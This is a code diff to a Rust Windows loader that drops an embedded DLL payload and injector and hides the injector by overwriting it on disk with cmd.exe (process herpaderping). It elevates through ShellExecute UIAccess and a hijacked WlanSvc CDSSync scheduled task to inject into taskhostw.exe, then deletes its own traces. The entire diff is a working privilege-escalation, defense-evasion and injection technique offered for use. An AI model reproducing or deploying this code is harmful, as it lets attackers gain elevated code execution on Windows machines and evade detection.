@@ -1,6 +1,7 @@
+// The `enum_process` and `process` modules have been removed since we always target taskhostw.exe
+
 mod embedded;
-mod enum_process;
-mod process;
+mod task_scheduler;
 
 use std::{
     ffi::CString,
@@ -14,9 +15,11 @@ use std::{
 };
 
 use ntapi::{ntmmapi::NtCreateSection, ntobapi::NtClose, ntrtl::RtlNtStatusToDosError};
+use scopeguard::defer;
 use winapi::um::winnt::{PAGE_READONLY, SEC_IMAGE, SECTION_ALL_ACCESS};
 use windows::{
     Win32::{
+        Foundation::HANDLE,
         System::Threading::WaitForSingleObject,
         UI::{
             Shell::{
@@ -28,16 +31,12 @@ use windows::{
     core::PCSTR,
 };
 
+use crate::task_scheduler::TaskManager;
+
 fn main() -> io::Result<()> {
     let system_root = PathBuf::from(std::env::var("SystemRoot").unwrap());
     let base_path = system_root.join("System32").join("LogFiles").join("WMI");
     let current_path = std::env::current_dir()?;
-
-    // Find suitable target process
-    let Some(candidate) = process::find_target_process()?.first().copied() else {
-        eprintln!("Could not find a suitable target process");
-        return Ok(());
-    };
 
     if !base_path.exists() {
         eprintln!("Target directory does not exist");
@@ -48,11 +47,21 @@ fn main() -> io::Result<()> {
     let payload_path = current_path.join("payload.dll");
     std::fs::write(&payload_path, embedded::PAYLOAD_BIN)?;
 
+    // Clean payload after use
+    defer!({
+        _ = std::fs::remove_file(&payload_path);
+    });
+
     // Write injector to disk
     let injector_path = base_path.join("injector.exe");
     std::fs::write(&injector_path, embedded::INJECTOR_BIN)?;
 
-    // Herpaderp time!
+    // Clean injector after use
+    defer!({
+        _ = std::fs::remove_file(&injector_path);
+    });
+
+    // Map the injector into memory for later execution
     let mut injector_file = File::options()
         .read(true)
         .write(true)
@@ -74,6 +83,12 @@ fn main() -> io::Result<()> {
         }
     }
 
+    // Free section after use
+    defer!(unsafe {
+        NtClose(section);
+    });
+
+    // Overwrite injector on disk with the trusted cmd.exe binary
     let mut cmd_file = File::open(system_root.join("System32").join("cmd.exe"))?;
     std::io::copy(&mut cmd_file, &mut injector_file)?;
 
@@ -81,32 +96,43 @@ fn main() -> io::Result<()> {
     drop(injector_file);
 
     // Execute injector
-    let result = execute_injector(
+    let injector_process = match execute_injector(
         &injector_path.to_string_lossy(),
-        candidate,
         &payload_path.to_string_lossy(),
-    );
+    ) {
+        Ok(handle) => handle,
+        Err(why) => {
+            eprintln!("Failed to execute injector: {why}");
+            return Ok(());
+        }
+    };
+
+    // Start scheduled task with maximum privileges
+    let task_manager = match TaskManager::new() {
+        Ok(manager) => manager,
+        Err(why) => {
+            eprintln!("Failed to connect to task scheduler service: {why}");
+            return Ok(());
+        }
+    };
+
+    if let Err(why) = task_manager.run_task("\\Microsoft\\Windows\\WlanSvc", "CDSSync") {
+        eprintln!("Failed to run task: {why}");
+        return Ok(());
+    }
+
+    unsafe { WaitForSingleObject(injector_process, u32::MAX) };
+
+    // Allow for injector and payload to clean up and release file locks before cleaning up ourselves
     std::thread::sleep(Duration::from_millis(250));
-
-    // Cleanup
-    unsafe {
-        NtClose(section);
-    }
-
-    _ = std::fs::remove_file(injector_path);
-    _ = std::fs::remove_file(payload_path);
-
-    if let Err(why) = result {
-        eprintln!("Could not spawn injector: {why}");
-    }
 
     Ok(())
 }
 
 /// Execute the injector using `ShellExecute` to allow for elevation to UIAccess
-fn execute_injector(injector_path: &str, pid: u32, payload_path: &str) -> io::Result<()> {
+fn execute_injector(injector_path: &str, payload_path: &str) -> io::Result<HANDLE> {
     let injector_path_c = CString::from_str(&injector_path).unwrap();
-    let params_c = CString::from_str(&format!("{pid} \"{payload_path}\"")).unwrap();
+    let params_c = CString::from_str(&format!("\"{payload_path}\"")).unwrap();
 
     unsafe {
         let mut info = SHELLEXECUTEINFOA::default();
@@ -118,8 +144,7 @@ fn execute_injector(injector_path: &str, pid: u32, payload_path: &str) -> io::Re
         info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;
 
         ShellExecuteExA(&mut info)?;
-        WaitForSingleObject(info.hProcess, u32::MAX);
-    }
 
-    Ok(())
+        Ok(info.hProcess)
+    }
 }
